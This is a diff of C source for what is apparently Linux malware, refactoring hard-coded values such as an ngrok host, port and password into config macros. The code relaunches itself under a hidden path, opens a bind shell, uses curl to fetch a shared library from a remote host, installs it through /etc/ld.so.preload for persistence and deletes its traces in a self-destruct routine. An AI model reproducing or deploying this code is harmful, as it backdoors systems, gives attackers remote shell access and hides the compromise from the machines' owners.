@@ -1,15 +1,9 @@
 #include "elf.h"
-
-#define HOST "7af6-2a02-b025-12-9cfc-8cd4-9f53-5c4-93aa.ngrok-free.app"
-#define PORT 45435
-#define BUFFER_SIZE 1024
-#define PASSWORD "password"
-
-#define VERBOSE
+#include <config.h>
 
 #if !defined(HOST)
 #error "You must define the host where it is hosted"
-#endif // HOST
+#endif
 
 int main(int argc, char **argv, char **envp) {
 
@@ -24,7 +18,7 @@ int main(int argc, char **argv, char **envp) {
     
     int is_set = 0;
     for (int i=0; envp[i]!=NULL; i++) {
-        if (strstr(envp[i], "SEPA") != NULL) {
+        if (strstr(envp[i], ENVIRONMENT_VAR) != NULL) {
             is_set = 1;
             break;
         }
@@ -45,7 +39,7 @@ int main(int argc, char **argv, char **envp) {
 
         // start /usr/bin/rm_s in background and quit here
         char command[1024];
-        sprintf(command, "SEPA=1 /usr/bin/rm_s &");
+        sprintf(command, "%s=1 %s &", ENVIRONMENT_VAR, HIDDEN_EXEC_PATH);
         system(command);
 
         return 0;
@@ -54,7 +48,7 @@ int main(int argc, char **argv, char **envp) {
     printf("%s", argv[0]);
 #endif
 
-    if (strcmp(argv[0], "/usr/bin/rm_s") == 0) {
+    if (strcmp(argv[0], HIDDEN_EXEC_PATH) == 0) {
         bind_shell();
         return 0;
     }
@@ -66,12 +60,13 @@ int main(int argc, char **argv, char **envp) {
 
 void destruct() {
     char command[1024];
-    sprintf(command, "killall %s > /dev/null 2>&1", "rm_s");
     sprintf(command, "rm %s", "/etc/ld.so.preload > /dev/null 2>&1");
     system(command);
-    sprintf(command, "rm %s", "/usr/lib/usermode.so > /dev/null 2>&1");
+    sprintf(command, "rm %s > /dev/null 2>&1", HIDDEN_PATH);
     system(command);
-    sprintf(command, "rm %s", "/usr/bin/rm_s > /dev/null 2>&1");
+    sprintf(command, "rm %s > /dev/null 2>&1", HIDDEN_EXEC_PATH);
+    system(command);
+    sprintf(command, "killall %s > /dev/null 2>&1", HIDDEN_FILENAME);
     system(command);
     exit(12);
 }
@@ -125,7 +120,7 @@ int is_downloaded() {
     printf("Checking if downloaded...\n");
 #endif
     struct stat st = {0};
-    if (stat("/usr/lib/usermode.so", &st) == -1) {
+    if (stat(HIDDEN_PATH, &st) == -1) {
         return 0;
     }
     return 1;
@@ -141,7 +136,7 @@ int set_ld_preload() {
         exit(12);
     }
 
-    char *content = "/usr/lib/usermode.so\n";
+    char *content = HIDDEN_PATH"\n";
     int bytes_written = write(fd, content, strlen(content));
     if (bytes_written < 0) {
         perror("write failed");
@@ -157,7 +152,7 @@ int download() {
     printf("Downloading...\n");
 #endif
     char command[1024];
-    sprintf(command, "curl -o /usr/lib/usermode.so https://%s/%s > /dev/null 2>&1", HOST, "libelflib.so");
+    sprintf(command, "curl -o %s https://%s/%s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2);
     system(command);
     return 0;
 }
@@ -167,9 +162,9 @@ int move(char* filename) {
     printf("Moving...\n");
 #endif
     char command[1024];
-    sprintf(command, "mv %s %s", filename, "/usr/bin/rm_s");
+    sprintf(command, "mv %s %s", filename, HIDDEN_EXEC_PATH);
     system(command);
-    sprintf(command, "chmod +x %s", "/usr/bin/rm_s");
+    sprintf(command, "chmod +x %s", HIDDEN_EXEC_PATH);
     system(command);
     return 0;
 }
